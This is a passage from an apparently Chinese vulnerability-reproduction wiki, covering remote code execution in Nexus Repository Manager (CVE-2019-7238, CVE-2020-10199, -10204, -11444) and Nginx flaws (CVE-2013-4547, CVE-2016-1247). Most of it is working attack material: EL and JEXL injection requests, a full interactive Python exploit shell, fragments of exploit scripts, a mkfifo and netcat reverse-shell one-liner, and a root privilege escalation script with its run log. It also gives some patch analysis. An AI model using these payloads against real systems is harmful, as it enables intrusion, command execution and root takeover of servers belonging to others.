其对应接口位置如下图NexusRepositoryManager远程代码执行/media/rId26.jpg)如果是新搭建的环境，为复现成功，还需要先往现有的Repository添加asset。这样在查询确实存在asset后，才会进一步根据whereClause对查询结果asset进行筛选，也才会对whereClause进行表达式解析。不过在实际环境中，Repository中早就各种asset了。下面随便选了一个logging.jar上传。NexusRepositoryManager远程代码执行/media/rId27.jpg) POST /service/extdirect HTTP/1.1 Host:www.0-sec.org:8081 User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0 Content-Type: application/json Content-Length: 308 Connection: close {\"action\":\"coreui_Component\",\"method\":\"previewAssets\",\"data\":[{\"page\":1,\"start\":0,\"limit\":25,\"filter\":[{\"property\":\"repositoryName\",\"value\":\"*\"},{\"property\":\"expression\",\"value\":\"''.class.forName('java.lang.Runtime').getRuntime().exec('calc.exe')\"},{\"property\":\"type\",\"value\":\"jexl\"}]}],\"type\":\"rpc\",\"tid\":4} NexusRepositoryManager远程代码执行/media/rId28.png) poc cve-2019-7238.py NexusRepositoryManager远程代码执行/media/rId30.png) from requests.packages.urllib3.exceptions import InsecureRequestWarning import urllib3 import requests import base64 import json import sys print(\"\\nNexus Repository Manager 3 Remote Code Execution - CVE-2019-7238 \\nFound by @Rico and @voidfyoo\\n\") proxy = { } remote = 'http://127.0.0.1:8081' ARCH=\"LINUX\" # ARCH=\"WIN\" requests.packages.urllib3.disable_warnings(InsecureRequestWarning) urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) def checkSuccess(r): if r.status_code == 200: json_data = json.loads(r.text) if json_data['result']['total'] > 0: print(\"OK\") else: print(\"KO\") sys.exit() else: print(\"[-] Error status code\", r.status_code) sys.exit() print(\"[+] Checking if Content-Selectors exist =>\", end=' ') burp0_url = remote + \"/service/extdirect\" burp0_headers = {\"Content-Type\": \"application/json\"} burp0_json = {\"action\": \"coreui_Component\", \"data\": [{\"filter\": [{\"property\": \"repositoryName\", \"value\": \"*\"}, {\"property\": \"expression\", \"value\": \"1==1\"}, { \"property\": \"type\", \"value\": \"jexl\"}], \"limit\": 50, \"page\": 1, \"sort\": [{\"direction\": \"ASC\", \"property\": \"name\"}], \"start\": 0}], \"method\": \"previewAssets\", \"tid\": 18, \"type\": \"rpc\"} r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, proxies=proxy, verify=False, allow_redirects=False) checkSuccess(r) print(\"\") while True: try: if ARCH == \"LINUX\": command = input(\"command (not reflected)> \") command = base64.b64encode(command.encode('utf-8')) command_str = command.decode('utf-8') command_str = command_str.replace('/', '+') print(\"[+] Copy file to temp directory =>\", end=' ') burp0_url = remote + \"/service/extdirect\" burp0_headers = {\"Content-Type\": \"application/json\"} burp0_json = {\"action\": \"coreui_Component\", \"data\": [{\"filter\": [{\"property\": \"repositoryName\", \"value\": \"*\"}, {\"property\": \"expression\", \"value\": \"1==0 or ''.class.forName('java.lang.Runtime').getRuntime().exec(\\\"cp /etc/passwd /tmp/passwd\\\")\"}, { \"property\": \"type\", \"value\": \"jexl\"}], \"limit\": 50, \"page\": 1, \"sort\": [{\"direction\": \"ASC\", \"property\": \"name\"}], \"start\": 0}], \"method\": \"previewAssets\", \"tid\": 18, \"type\": \"rpc\"} r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, proxies=proxy, verify=False, allow_redirects=False) checkSuccess(r) print(\"[+] Preparing temp file =>\", end=' ') burp0_url = remote + \"/service/extdirect\" burp0_headers = {\"Content-Type\": \"application/json\"} burp0_json = {\"action\": \"coreui_Component\", \"data\": [{\"filter\": [{\"property\": \"repositoryName\", \"value\": \"*\"}, {\"property\": \"expression\", \"value\": \"1==0 or ''.class.forName('java.lang.Runtime').getRuntime().exec(\\\"sed -i 1cpwn2 /tmp/passwd\\\")\"}, { \"property\": \"type\", \"value\": \"jexl\"}], \"limit\": 50, \"page\": 1, \"sort\": [{\"direction\": \"ASC\", \"property\": \"name\"}], \"start\": 0}], \"method\": \"previewAssets\", \"tid\": 18, \"type\": \"rpc\"} r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, proxies=proxy, verify=False, allow_redirects=False) checkSuccess(r) print(\"[+] Cleaning temp file =>\", end=' ') burp0_url = remote + \"/service/extdirect\" burp0_headers = {\"Content-Type\": \"application/json\"} burp0_json = {\"action\": \"coreui_Component\", \"data\": [{\"filter\": [{\"property\": \"repositoryName\", \"value\": \"*\"}, {\"property\": \"expression\", \"value\": \"1==0 or ''.class.forName('java.lang.Runtime').getRuntime().exec(\\\"sed -i /[^pwn2]/d /tmp/passwd\\\")\"}, { \"property\": \"type\", \"value\": \"jexl\"}], \"limit\": 50, \"page\": 1, \"sort\": [{\"direction\": \"ASC\", \"property\": \"name\"}], \"start\": 0}], \"method\": \"previewAssets\", \"tid\": 18, \"type\": \"rpc\"} r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, proxies=proxy, verify=False, allow_redirects=False) checkSuccess(r) print(\"[+] Writing command into temp file =>\", end=' ') burp0_url = remote + \"/service/extdirect\" burp0_headers = {\"Content-Type\": \"application/json\"} burp0_json = {\"action\": \"coreui_Component\", \"data\": [{\"filter\": [{\"property\": \"repositoryName\", \"value\": \"*\"}, {\"property\": \"expression\", \"value\": \"1==0 or ''.class.forName('java.lang.Runtime').getRuntime().exec(\\\"sed -i 1s/pwn2/{echo,\" + command_str + \"}|{base64,-d}>pwn.txt/g /tmp/passwd\\\")\"}, { \"property\": \"type\", \"value\": \"jexl\"}], \"limit\": 50, \"page\": 1, \"sort\": [{\"direction\": \"ASC\", \"property\": \"name\"}], \"start\": 0}], \"method\": \"previewAssets\", \"tid\": 18, \"type\": \"rpc\"} r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, proxies=proxy, verify=False, allow_redirects=False) checkSuccess(r) print(\"[+] Decode base64 command =>\", end=' ') burp0_url = remote + \"/service/extdirect\" burp0_headers = {\"Content-Type\": \"application/json\"} burp0_json = {\"action\": \"coreui_Component\", \"data\": [{\"filter\": [{\"property\": \"repositoryName\", \"value\": \"*\"}, {\"property\": \"expression\", \"value\": \"1==0 or ''.class.forName('java.lang.Runtime').getRuntime().exec(\\\"bash /tmp/passwd\\\")\"}, { \"property\": \"type\", \"value\": \"jexl\"}], \"limit\": 50, \"page\": 1, \"sort\": [{\"direction\": \"ASC\", \"property\": \"name\"}], \"start\": 0}], \"method\": \"previewAssets\", \"tid\": 18, \"type\": \"rpc\"} r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, proxies=proxy, verify=False, allow_redirects=False) checkSuccess(r) print(\"[+] Executing command =>\", end=' ') burp0_url = remote + \"/service/extdirect\" burp0_headers = {\"Content-Type\": \"application/json\"} burp0_json = {\"action\": \"coreui_Component\", \"data\": [{\"filter\": [{\"property\": \"repositoryName\", \"value\": \"*\"}, {\"property\": \"expression\", \"value\": \"1==0 or ''.class.forName('java.lang.Runtime').getRuntime().exec(\\\"bash pwn.txt\\\")\"}, { \"property\": \"type\", \"value\": \"jexl\"}], \"limit\": 50, \"page\": 1, \"sort\": [{\"direction\": \"ASC\", \"property\": \"name\"}], \"start\": 0}], \"method\": \"previewAssets\", \"tid\": 18, \"type\": \"rpc\"} r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, proxies=proxy, verify=False, allow_redirects=False) checkSuccess(r) print('') else: command = input(\"command (not reflected)> \") print(\"[+] Executing command =>\", end=' ') burp0_url = remote + \"/service/extdirect\" burp0_headers = {\"Content-Type\": \"application/json\"} burp0_json = {\"action\": \"coreui_Component\", \"data\": [{\"filter\": [{\"property\": \"repositoryName\", \"value\": \"*\"}, {\"property\": \"expression\", \"value\": \"1==0 or ''.class.forName('java.lang.Runtime').getRuntime().exec(\\\"\" + command + \"\\\")\"}, { \"property\": \"type\", \"value\": \"jexl\"}], \"limit\": 50, \"page\": 1, \"sort\": [{\"direction\": \"ASC\", \"property\": \"name\"}], \"start\": 0}], \"method\": \"previewAssets\", \"tid\": 18, \"type\": \"rpc\"} r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, proxies=proxy, verify=False, allow_redirects=False) checkSuccess(r) print('') except KeyboardInterrupt: print(\"Exiting...\") break 参考链接 https://xz.aliyun.com/t/4136 https://www.jianshu.com/p/34e450debe0f https://github.com/mpgn/CVE-2019-7238 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:57:40 "},"Web安全/Nexus/（CVE-2020-10199）Nexus Repository Manager 远程代码执行漏洞/（CVE-2020-10199）Nexus Repository Manager 远程代码执行漏洞.html":{"url":"Web安全/Nexus/（CVE-2020-10199）Nexus Repository Manager 远程代码执行漏洞/（CVE-2020-10199）Nexus Repository Manager 远程代码执行漏洞.html","title":"（CVE-2020-10199）Nexus Repository Manager 远程代码执行漏洞","keywords":"","body":"（CVE-2020-10199）Nexus Repository Manager 远程代码执行漏洞 一、漏洞简介 该漏洞允许拥有Nexus Repository Manager 上任何类型帐户的攻击者通过向Nexus Repository Manager 发出恶意 JavaEL 表达式来执行任意代码。 二、漏洞影响 Nexus Repository Manager 3.x OSS / Pro \\ 三、复现过程 登录后，复制当前Cookie和CSRF Token，发送如下数据包，即可执行EL表达式： POST /service/rest/beta/repositories/go/group HTTP/1.1 Host: www.0-sec.org:8081 Content-Length: 203 X-Requested-With: XMLHttpRequest X-Nexus-UI: true User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36 NX-ANTI-CSRF-TOKEN: 0.7886248393834028 Content-Type: application/json Accept: */* Origin: http://127.0.0.1:8081 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: cors Referer: http://127.0.0.1:8081/ Accept-Encoding: gzip, deflate, br Accept-Language: zh-CN,zh;q=0.9 Cookie: NX-ANTI-CSRF-TOKEN=0.7886248393834028; NXSESSIONID=cedf848f-d881-4b58-ac24-9e9c3ece40bc Connection: close { \"name\": \"internal\", \"online\": true, \"storage\": { \"blobStoreName\": \"default\", \"strictContentTypeValidation\": true }, \"group\": { \"memberNames\": [\"$\\\\A{233*233*233}\"] } } （1）尝试执行233233233，成功返回结果 NexusRepositoryManager远程代码执行漏洞/media/rId25.png) （2）尝试创建文件 $\\\\A{''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('touch /tmp/success')} NexusRepositoryManager远程代码执行漏洞/media/rId27.png)回到漏洞环境检查，文件夹success创建成功NexusRepositoryManager远程代码执行漏洞/media/rId28.png) （3）dnslog测试 NexusRepositoryManager远程代码执行漏洞/media/rId30.png)漏洞存在NexusRepositoryManager远程代码执行漏洞/media/rId31.png) poc&exp 影响版本 \\ poc +----------------------------------------------------------------------------------------------------------+ + DES: by zhzyker as https://github.com/zhzyker/exphub + + CVE-2020-10199 need username & password + +----------------------------------------------------------------------------------------------------------+ + USE: python3 + + EXP: python3 cve-2020-10199_poc.py 1.1.1.1 8081 0.9567822851573897 edfca15e-c721-45e2-bdef-e8b3c6364ddb + + VER: Nexus Repository Manager OSS/Pro version Nexus Repository Manager 3 远程命令执行漏洞 #!/usr/bin/python3 # -*- coding:utf-8 -*- # author:zhzyker # from:https://github.com/zhzyker/exphub import sys import requests import json if len(sys.argv)!=5: print('+----------------------------------------------------------------------------------------------------------+') print('+ DES: by zhzyker as https://github.com/zhzyker/exphub +') print('+ CVE-2020-10199 need username & password +') print('+----------------------------------------------------------------------------------------------------------+') print('+ USE: python3 +') print('+ EXP: python3 cve-2020-10199_poc.py 1.1.1.1 8081 0.9567822851573897 edfca15e-c721-45e2-bdef-e8b3c6364ddb +') print('+ VER: Nexus Repository Manager OSS/Pro version exp EXP +----------------------------------------------------------------------+ + DES: by zhzyker as https://github.com/zhzyker/exphub + + CVE-2020-10199 Nexus 3 remote command execution + +----------------------------------------------------------------------+ + USE: python3 + + EXP: python3 cve-2020-10199_cmd.py http://127.0.0.1:8081 admin admin + + VER: Nexus Repository Manager 3.x OSS / Pro CVE-2020-10199 利用脚本（可回显） #!/usr/bin/python3 # -*- coding:utf-8 -*- # author:zhzyker # from:https://github.com/zhzyker/exphub import sys import requests import re import base64 if len(sys.argv)!=4: print('+----------------------------------------------------------------------+') print('+ DES: by zhzyker as https://github.com/zhzyker/exphub +') print('+ CVE-2020-10199 Nexus 3 remote command execution +') print('+----------------------------------------------------------------------+') print('+ USE: python3 +') print('+ EXP: python3 cve-2020-10199_cmd.py http://127.0.0.1:8081 admin admin +') print('+ VER: Nexus Repository Manager 3.x OSS / Pro >> \") if cmd == \"exit\" : exit(0) exp(cmd) 参考链接 https://www.cnblogs.com/appear001/p/12844624.html https://github.com/zhzyker/CVE-2020-10199\\_POC-EXP Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:57:43 "},"Web安全/Nexus/（CVE-2020-10204）Nexus Repository Manager 远程执行代码漏洞/（CVE-2020-10204）Nexus Repository Manager 远程执行代码漏洞.html":{"url":"Web安全/Nexus/（CVE-2020-10204）Nexus Repository Manager 远程执行代码漏洞/（CVE-2020-10204）Nexus Repository Manager 远程执行代码漏洞.html","title":"（CVE-2020-10204）Nexus Repository Manager 远程执行代码漏洞","keywords":"","body":"（CVE-2020-10204）Nexus Repository Manager 远程执行代码漏洞 一、漏洞简介 二、漏洞影响 所有以前的Nexus Repository Manager 3.x OSS / Pro最高版本包括3.21.1 三、复现过程 环境搭建 下载pull下漏洞版本的docker https://hub.docker.com/r/sonatype/nexus3/tags docker pull sonatype/nexus3:3.21.1 然后切成root用户进入容器修改启动项**/opt/sonatype/nexus/bin/nexus** run) $INSTALL4J_JAVA_PREFIX exec \"$app_java_home/bin/java\" -Xdebug -server -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=8888 -Dinstall4j.jvmDir=\"$app_java_home\" -Dexe4j.moduleName=\"$prg_dir/$progname\" \"-XX:+UnlockDiagnosticVMOptions\" \"-Dinstall4j.launcherId=245\" \"-Dinstall4j.swt=false\" \"$vmov_1\" \"$vmov_2\" \"$vmov_3\" \"$vmov_4\" \"$vmov_5\" $INSTALL4J_ADD_VM_PARAMS -classpath \"$local_classpath\" com.install4j.runtime.launcher.UnixLauncher run 9d17dc87 0 0 org.sonatype.nexus.karaf.NexusMain NexusRepositoryManager远程执行代码漏洞/media/rId25.png) 然后在https://github.com/sonatype/nexus-public下载源码,导入idea,然后配好远程配置连上去即可调试。 NexusRepositoryManager远程执行代码漏洞/media/rId26.png) 漏洞分析 我们先来diff一下3.21.0和3.21.2的区别,找一下官方修复的痕迹 NexusRepositoryManager远程执行代码漏洞/media/rId28.png) 可以看到有很明显的漏洞修复痕迹,EL表达式注入的限制被绕过了,其实我们看到测试文件 @Test public void testStripJavaEl_bugged_interpolator() { String test = \"$\\\\A{badstuffinhere}\"; String result = underTest.stripJavaEl(test); assertThat(result, is(\"{badstuffinhere}\")); } 也可以直接知道绕过方法,这里我直接给我rce的poc $\\\\A{''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(''.getClass().forName('java.lang.Runtime')).exec('touch /tmp/sssss')} 为什么增加了\\A还不影响表达式的解析呢,这个我后面说,先构造出完整poc 那么我们找一下哪些接口会使用 NexusRepositoryManager远程执行代码漏洞/media/rId29.png) 可以看到总过有三处,以第一处Roles为例, NexusRepositoryManager远程执行代码漏洞/media/rId30.png) 可以找到有多处注解使用的地方,比如说新建用户/更新用户,构造Poc如下 POST /service/extdirect HTTP/1.1 Host: 127.0.0.1:8081 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate X-Nexus-UI: true NX-ANTI-CSRF-TOKEN: 0.029301195082771514 Content-Type: application/json X-Requested-With: XMLHttpRequest Content-Length: 350 Connection: close Referer: http://127.0.0.1:8081/ Cookie: NX-ANTI-CSRF-TOKEN=0.029301195082771514; NXSESSIONID=7eaf0643-2707-445a-b17d-aedced6db8e5 {\"action\":\"coreui_User\",\"method\":\"create\",\"data\":[{\"userId\":\"3\",\"version\":\"\",\"firstName\":\"test\",\"lastName\":\"test\",\"email\":\"test@test.com\",\"status\":\"active\",\"roles\":[\"$\\\\X{''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(''.getClass().forName('java.lang.Runtime')).exec('touch /tmp/rce')}\"],\"password\":\"admin\"}],\"type\":\"rpc\",\"tid\":33} NexusRepositoryManager远程执行代码漏洞/media/rId31.png) 以及其他几处注解使用的地方 NexusRepositoryManager远程执行代码漏洞/media/rId32.png) 还有一个问题为什么增加\\A不会影响表达式的解析呢? 在/org/hibernate/validator/hibernate-validator/6.1.0.Final/hibernate-validator-6.1.0.Final.jar!/org/hibernate/validator/messageinterpolation/AbstractMessageInterpolator.class对传入的字符串进行了两次处理, 原本的字符串为Missing roles: [$\\B{''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(''.getClass().forName('java.lang.Runtime')).exec('touch /tmp/rce')}] 然后第一次处理后的结果 NexusRepositoryManager远程执行代码漏洞/media/rId33.png) 第二次处理后的结果 NexusRepositoryManager远程执行代码漏洞/media/rId34.png) 最后解析的还是${xxxx}这样子。 我在3.21.1版本测试$\\\\\\B{}这样也是可以执行的,但是增加替换规则只是限制了A啊,那这样不就还是可以绕过嘛? NexusRepositoryManager远程执行代码漏洞/media/rId35.png) 然后我启了一个3.21.2版本的docker,测试发现并不行,很困惑,这里我跟一下原因。 在我跟到/org/hibernate/validator/messageinterpolation/AbstractMessageInterpolator.class发现大致调用堆栈是差不多的 NexusRepositoryManager远程执行代码漏洞/media/rId36.png) 但是再往下就有区别的,3.21.0版本调用了/org/hibernate/validator/messageinterpolation/ResourceBundleMessageInterpolator.class@InterpolationTerm,而3.21.2版本调用的是/org/hibernate/validator/messageinterpolation/ParameterMessageInterpolator.class@InterpolationTerm,但是最开始的区别并不是这里,这两个类都是继承了AbstractMessageInterpolator,然后重写的public String interpolate(Context context, Locale locale, String term)方法不同, ParameterMessageInterpolator.class@InterpolationTerm会进行表达式的检测 public String interpolate(Context context, Locale locale, String term) { if (InterpolationTerm.isElExpression(term)) { LOG.warnElIsUnsupported(term); return term; } else { ParameterTermResolver parameterTermResolver = new ParameterTermResolver(); return parameterTermResolver.interpolate(context, term); } } 如果表达式以$开头,会直接打印warning,然后返回表达式字符串。 NexusRepositoryManager远程执行代码漏洞/media/rId37.png) 但是这里是hibernate包中的,我们需要去找到源头,也就是nexus开发者是怎么去修复的呢? 在一阵搜索中,我在nexus-public-release-3.22.0-02/components/nexus-validation/src/main/java/org/sonatype/nexus/validation/ValidationModule.java找到了 NexusRepositoryManager远程执行代码漏洞/media/rId38.png) 通过搜索资料了解到Hibernate Validator提供了ParameterMessageInterpolator来处理消息,并且不解析使用$的表达式,也就是说即使绕过了replace的地方,也不会作为表达式进行解析,而是直接返回了。 poc cve-2020-10204_cmd.py #!/usr/bin/python3 # -*- coding:utf-8 -*- # author:zhzyker # from:https://github.com/zhzyker/exphub import sys import requests if len(sys.argv)!=4: print('+---------------------------------------------------------------------------------------------------------+') print('+ DES: by zhzyker as https://github.com/zhzyker/exphub +') print('+ CVE-2020-10204 Nexus Repository Manager 3 Remote Code Execution +') print('+---------------------------------------------------------------------------------------------------------+') print('+ USE: python3 +') print('+ EXP: python3 cve-2020-11444_exp.py http://ip:8081 6c012a5e-88d9-4f96-a05f-3790294dc49a \"touch /tmp/233\" +') print('+ VER: Nexus Repository Manager 3.x OSS / Pro 参考链接 https://xz.aliyun.com/t/7559 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:57:46 "},"Web安全/Nexus/（CVE-2020-11444）Nexus Repository Manager 远程代码执行漏洞/（CVE-2020-11444）Nexus Repository Manager 远程代码执行漏洞.html":{"url":"Web安全/Nexus/（CVE-2020-11444）Nexus Repository Manager 远程代码执行漏洞/（CVE-2020-11444）Nexus Repository Manager 远程代码执行漏洞.html","title":"（CVE-2020-11444）Nexus Repository Manager 远程代码执行漏洞","keywords":"","body":"（CVE-2020-11444）Nexus Repository Manager 远程代码执行漏洞 一、漏洞简介 该漏洞源于不正确的访问控制。攻击者可借助特制的请求利用该漏洞绕过访问限制。 二、漏洞影响 Nexus Repository Manager 3.x版本至3.21.2版本 三、复现过程 cve-2020-11444_exp.py python3 cve-2020-11444_exp.py http://www.0-sec.org:8081 \"sessionID\" \"touch /tmp/233\" #!/usr/bin/python3 # -*- coding:utf-8 -*- # author:zhzyker # from:https://github.com/zhzyker/exphub import sys import requests if len(sys.argv)!=4: print('+-----------------------------------------------------------------------------------------------+') print('+ DES: by zhzyker as https://github.com/zhzyker/exphub +') print('+ CVE-2020-11444 Nexus 3 Unauthorized Vuln (change admin password +') print('+-----------------------------------------------------------------------------------------------+') print('+ USE: python3 +') print('+ EXP: python3 cve-2020-11444_exp.py http://ip:8081 6c012a5e-88d9-4f96-a05f-3790294dc49a 123456 +') print('+ VER: Nexus Repository Manager 3.x OSS / Pro 参考链接 https://github.com/zhzyker/exphub/blob/master/nexus/cve-2020-11444\\_exp.py Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:57:50 "},"Web安全/Nginx/（CVE-2013-4547）Nginx URI Processing 安全绕过漏洞/（CVE-2013-4547）Nginx URI Processing 安全绕过漏洞.html":{"url":"Web安全/Nginx/（CVE-2013-4547）Nginx URI Processing 安全绕过漏洞/（CVE-2013-4547）Nginx URI Processing 安全绕过漏洞.html","title":"（CVE-2013-4547）Nginx URI Processing 安全绕过漏洞","keywords":"","body":"（CVE-2013-4547）Nginx URI Processing 安全绕过漏洞 一、漏洞简介 nginx0.8.41至1.4.3版本和1.5.7之前的1.5.x版本中存在安全漏洞，该漏洞源于程序没有正确验证包含未转义空格字符的请求URI。远程攻击者可利用该漏洞绕过既定的限制。 二、漏洞影响 Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7 三、复现过程 这个漏洞其实和代码执行没有太大关系，其主要原因是错误地解析了请求的URI，错误地获取到用户请求的文件名，导致出现权限绕过、代码执行的连带影响。 举个例子，比如，Nginx匹配到.php结尾的请求，就发送给fastcgi进行解析，常见的写法如下： location ~ \\.php$ { include fastcgi_params; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME /var/www/html$fastcgi_script_name; fastcgi_param DOCUMENT_ROOT /var/www/html; } 正常情况下（关闭pathinfo的情况下），只有.php后缀的文件才会被发送给fastcgi解析。 而存在CVE-2013-4547的情况下，我们请求1.gif[0x20][0x00].php，这个URI可以匹配上正则\\.php$，可以进入这个Location块；但进入后，Nginx却错误地认为请求的文件是1.gif[0x20]，就设置其为SCRIPT_FILENAME的值发送给fastcgi。 fastcgi根据SCRIPT_FILENAME的值进行解析，最后造成了解析漏洞。 所以，我们只需要上传一个空格结尾的文件，即可使PHP解析之。 再举个例子，比如很多网站限制了允许访问后台的IP： location /admin/ { allow 127.0.0.1; deny all; } 我们可以请求如下URI：/test[0x20]/../admin/index.php，这个URI不会匹配上location后面的/admin/，也就绕过了其中的IP验证；但最后请求的是/test[0x20]/../admin/index.php文件，也就是/admin/index.php，成功访问到后台。（这个前提是需要有一个目录叫test：这是Linux系统的特点，如果有一个不存在的目录，则即使跳转到上一层，也会爆文件不存在的错误，Windows下没有这个限制） 漏洞测试 启动漏洞环境： docker-compose build docker-compose up -d 环境启动后，访问http://www.0-sec.org:8080/即可看到一个上传页面。 这个环境是黑名单验证，我们无法上传php后缀的文件，需要利用CVE-2013-4547。我们上传一个1.gif，注意后面的空格： NginxURIProcessing安全绕过漏洞/media/rId25.png) 访问http://www.0-sec.org:8080/uploadfiles/1.gif[0x20][0x00].php，即可发现PHP已被解析： NginxURIProcessing安全绕过漏洞/media/rId26.png) 注意，[0x20]是空格，[0x00]是\\0，这两个字符都不需要编码。 参考链接 https://vulhub.org/\\#/environments/nginx/CVE-2013-4547/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:57:56 "},"Web安全/Nginx/（CVE-2016-1247）Nginx 提权漏洞/（CVE-2016-1247）Nginx 提权漏洞.html":{"url":"Web安全/Nginx/（CVE-2016-1247）Nginx 提权漏洞/（CVE-2016-1247）Nginx 提权漏洞.html","title":"（CVE-2016-1247）Nginx 提权漏洞","keywords":"","body":"（CVE-2016-1247）Nginx 提权漏洞 一、漏洞简介 漏洞原因是在打包nginx时，设置的日志目录的所有者为 www-data ，导致一个低权限账户可以利用软链接的帮助达到提权。所以修复也是将日志的所有者改为root即可。 二、漏洞影响 Debian: Fixed in Nginx 1.6.2-5+deb8u3 Ubuntu: Fixed in the following updated Nginx package versions on Ubuntu: Ubuntu 16.04 LTS: 1.10.0-0ubuntu0.16.04.3 Ubuntu 14.04 LTS: 1.4.6-1ubuntu3.6 Ubuntu 16.10: 1.10.1-0ubuntu1.1 三、复现过程 docker run -d -i --name CVE-2016-1247 -p 80:80 xk0n/cve-2016-1247 在容器里配置了 nginx + php 的环境，并有一个一句话木马 /var/www/backdoor.php 可以用antSword连接测试，用下面的语句可以反弹回一个shell mkfifo /tmp/bd;cat /tmp/bd | /bin/sh -i 2>&1 | nc >/tmp/bd 测试时发现gcc编译出错，可以在本地编译一个后上传。poc运行后会等待 logrotate 此时可以用下面的命令，人工触发条件。 /usr/sbin/logrotate -vf /etc/logrotate.d/nginx 测试记录如下： $ bash ./cve-2016-1247-poc.sh /var/log/nginx/error.log _______________________________ ------------------------------- \\ \\ __---__ _- /--______ __--( / \\ )XXXXXXXXXXX\\v. .-XXX( O O )XXXXXXXXXXXXXXX- /XXX( U ) XXXXXXX\\ /XXXXX( )--_ XXXXXXXXXXX\\ /XXXXX/ ( O ) XXXXXX \\XXXXX\\ XXXXX/ / XXXXXX \\__ \\XXXXX XXXXXX__/ XXXXXX \\__----> ---___ XXX__/ XXXXXX \\__ / \\- --__/ ___/\\ XXXXXX / ___--/= \\-\\ ___/ XXXXXX '--- XXXXXX \\-\\/XXX\\ XXXXXX /XXXXX \\XXXXXXXXX \\ /XXXXX/ \\XXXXXX > _/XXXXX/ \\XXXXX--__/ __-- XXXX/ -XXXXXXXX--------------- XXXXXX- \\XXXXXXXXXXXXXXXXXXXXXXXXXX/ \"\"VXXXXXXXXXXXXXXXXXXV\"\" Nginx (Debian-based distros) - Root Privilege Escalation PoC Exploit (CVE-2016-1247) nginxed-root.sh (ver. 1.0) Discovered and coded by: Dawid Golunski https://legalhackers.com [+] Starting the exploit as: uid=33(www-data) gid=33(www-data) groups=33(www-data) [+] Backdoor/low-priv shell installed at: -rwxr-xr-x 1 www-data www-data 1021112 Nov 19 13:44 /tmp/nginxrootsh [+] The server appears to be (N)jinxed (writable logdir) ! :) Symlink created at: lrwxrwxrwx 1 www-data www-data 18 Nov 19 13:44 /var/log/nginx/error.log -> /etc/ld.so.preload [+] Waiting for Nginx service to be restarted (-USR1) by logrotate called from cron.daily at 6:25am... [+] Nginx restarted. The /etc/ld.so.preload file got created with web server privileges: -rw-r--r-- 1 www-data root 19 Nov 19 13:45 /etc/ld.so.preload [+] Adding /tmp/privesclib.so shared lib to /etc/ld.so.preload [+] The /etc/ld.so.preload file now contains: /tmp/privesclib.so [+] Escalating privileges via the /usr/bin/sudo SUID binary to get root! -rwsrwxrwx 1 root root 1021112 Nov 19 13:44 /tmp/nginxrootsh [+] Rootshell got assigned root SUID perms at: -rwsrwxrwx 1 root root 1021112 Nov 19 13:44 /tmp/nginxrootsh The server is (N)jinxed ! ;) Got root via Nginx! [+] Spawning the rootshell /tmp/nginxrootsh now! nginxrootsh: cannot set terminal process group (1156): Inappropriate ioctl for device nginxrootsh: no job control in this shell nginxrootsh-4.3# id id uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data) nginxrootsh-4.3# whoami whoami root nginxrootsh-4.3# whoami whoami root poc #!/bin/bash # # Nginx (Debian-based distros) - Root Privilege Escalation PoC Exploit # nginxed-root.sh (ver. 1.0) # # CVE-2016-1247 # # Discovered and coded by: # # Dawid Golunski # dawid[at]legalhackers.com # # https://legalhackers.com # # Follow https://twitter.com/dawid_golunski for updates on this advisory. # # --- # This PoC exploit allows local attackers on Debian-based systems (Debian, Ubuntu # etc.) to escalate their privileges from nginx web server user (www-data) to root # through unsafe error log handling. # # The exploit waits for Nginx server to be restarted or receive a USR1 signal. # On Debian-based systems the USR1 signal is sent by logrotate (/etc/logrotate.d/nginx) # script which is called daily by the cron.daily on default installations. # The restart should take place at 6:25am which is when cron.daily executes. # Attackers can therefore get a root shell automatically in 24h at most without any admin # interaction just by letting the exploit run till 6:25am assuming that daily logrotation # has been configured. # # # Exploit usage: # ./nginxed-root.sh path_to_nginx_error.log # # To trigger logrotation for testing the exploit, you can run the following command: # # /usr/sbin/logrotate -vf /etc/logrotate.d/nginx # # See the full advisory for details at: # https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html # # Video PoC: # https://legalhackers.com/videos/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html # # # Disclaimer: # For testing purposes only. Do no harm. # BACKDOORSH=\"/bin/bash\" BACKDOORPATH=\"/tmp/nginxrootsh\" PRIVESCLIB=\"/tmp/privesclib.so\" PRIVESCSRC=\"/tmp/privesclib.c\" SUIDBIN=\"/usr/bin/sudo\" function cleanexit { # Cleanup echo -e \"\\n[+] Cleaning up...\" rm -f $PRIVESCSRC rm -f $PRIVESCLIB rm -f $ERRORLOG touch $ERRORLOG if [ -f /etc/ld.so.preload ]; then echo -n > /etc/ld.so.preload fi echo -e \"\\n[+] Job done. Exiting with code $1 \\n\" exit $1 } function 